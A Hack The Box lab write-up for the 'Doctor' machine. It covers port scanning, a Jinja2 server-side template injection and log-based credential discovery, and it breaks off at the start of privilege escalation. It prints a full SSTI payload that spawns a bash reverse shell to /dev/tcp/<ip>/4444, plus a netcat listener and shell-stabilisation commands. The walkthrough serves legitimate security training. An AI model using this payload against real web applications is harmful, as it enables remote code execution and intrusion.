# Hack the box
## Doctor writeup

### Enumeartion / Recon

+ nmap port scan - ```nmap -sC -sV -oN nmap.txt 10.10.10.209```
```bash
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 59:4d:4e:c2:d8:cf:da:9d:a8:c8:d0:fd:99:a8:46:17 (RSA)
|   256 7f:f3:dc:fb:2d:af:cb:ff:99:34:ac:e0:f8:00:1e:47 (ECDSA)
|_  256 53:0e:96:6b:9c:e9:c1:a1:70:51:6c:2d:ce:7b:43:e8 (ED25519)
80/tcp   open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Doctor
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.41 (Ubuntu)
8089/tcp open  ssl/unknown
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Issuer: commonName=SplunkCommonCA/organizationName=Splunk/stateOrProvinceName=CA/countryName=US
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-09-06T15:57:27
| Not valid after:  2023-09-06T15:57:27
| MD5:   db23:4e5c:546d:8895:0f5f:8f42:5e90:6787
|_SHA-1: 7ec9:1bb7:343f:f7f6:bdd7:d015:d720:6f6f:19e2:098b
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
+ Open ports are
  + ssh on port 22
  + http on port 80
  + splunk on port 8089

+ Nothing interesting found on the website, looks like a static website, checking hostnames
+ Found a hostname ```doctors.htb``` on the website, adding to ```/etc/hosts``` file
+ Visiting doctors.htb sends us to another page
![image](https://github.com/brownPineapple/hackthebox/assets/30342446/cde2e474-48ac-406a-aa38-107b86c7b564)
+ We can register and it creates an account for 20 minutes
+ Checking the source and see something strange - _<!--archive still under beta testing<a class="nav-item nav-link" href="/archive">Archive</a>-->_
+ We can create posts on this website and it shows us the posts on the homepage
+ Checking /archive directory but nothing interesting
+ Checking the source of /archive and found something interesting, it has xml output of the posts that we create
+ TRYING SSTI hacktricks injection ```{{ 7*7 }}``` and we get 49 on the archive source ```view-source:http://doctors.htb/archive```

![image](https://github.com/brownPineapple/hackthebox/assets/30342446/58379fa5-5355-4014-aec1-113cebd7ae90)

+ Testing multiple Server Side Template Injection from https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti
+ **SUCCESS** We have successful SSTI
![image](https://github.com/brownPineapple/hackthebox/assets/30342446/7da4af12-c81a-428f-81bd-7caedaf941ff)

### Initial Foothold

+ Checking for reverse shell payloads on PayloadAllTheThings SSTI -
+ The one that worked was - ```{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("bash -c 'bash -i >& /dev/tcp/<ip>/4444 0>&1'").read()}}{%endif%}{%endfor%}```
+ Starting netcat listener - ```nc -lvnp 4444``` and getting reverse shell as web@doctor
![image](https://github.com/brownPineapple/hackthebox/assets/30342446/2e42813a-dcba-415b-bdbf-b15d7951a808)
+ ```/home``` directory has another user shaun with user.txt file
+ We are part of the admin group, we can check audit logs for passwords
  ```bash
  id
  uid=1001(web) gid=1001(web) groups=1001(web),4(adm)
  ```

### Lateral movement

+ To get user we need access to shaun user
+ Making the shell stable
  1. run this command ```python3 -c 'import pty;pty.spawn("/bin/bash")'``` on victim machine
  2. if the above doesn't work try - ```script -qc /bin/bash /dev/null```
  3. Do **ctrl+z** to background the process
  4. On your host machine in the same session do ```stty raw -echo;fg``` + Enter + Enter
  5. Now you have a stable shell
![image](https://github.com/brownPineapple/hackthebox/assets/30342446/69c9d560-27e9-415b-9dfb-890b9f950dd6)

+ Running Linpeas on the machine
+ Found something in the logs
```bash
/var/log/apache2/backup:10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] "POST /reset_password?email=Guitar123" 500 453 "http://doctor.htb/reset_password"
```
+ Trying the password for shaun user
+ BOOM, we are user
![image](https://github.com/brownPineapple/hackthebox/assets/30342446/6dc8a106-f03d-4179-8165-504fc8b7999d)

### Privilege escalation

+ Remebering that splunk was running on the machine
+ Checking who is running splunk
![image](https://github.com/brownPineapple/hackthebox/assets/30342446/e21dea3b-0b59-4aef-b05d-4695d319b512)
